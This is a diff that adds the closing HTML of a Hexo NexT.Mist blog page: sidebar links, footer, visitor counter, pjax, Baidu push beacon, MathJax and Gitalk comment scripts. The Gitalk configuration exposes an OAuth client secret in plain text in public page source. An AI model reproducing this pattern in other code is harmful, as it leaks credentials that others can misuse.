+        <a href="https://github.com/noone40404" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;noone40404" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ctp314.github.io/" title="https:&#x2F;&#x2F;ctp314.github.io&#x2F;" rel="noopener" target="_blank">CTime_Pup_314</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/guanlexiangfan/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;guanlexiangfan&#x2F;" rel="noopener" target="_blank">Evitagen</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.luogu.com.cn/blog/i-am-zhiyangfan/" title="https:&#x2F;&#x2F;www.luogu.com.cn&#x2F;blog&#x2F;i-am-zhiyangfan&#x2F;" rel="noopener" target="_blank">zhiyangfan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/Vitheon/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Vitheon&#x2F;" rel="noopener" target="_blank">Vareal</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">noone___</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'ebdb5b537395179b4514',
+      clientSecret: 'd0843e5853efe963ca9983db6cac3a1f9d736856',
+      repo        : 'noone40404.github.io',
+      owner       : 'noone40404',
+      admin       : ['noone40404'],
+      id          : '9db24b8b297fd53033dade224bebb972',
+        language: 'zn-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+    </div>
+</body>
+</html>
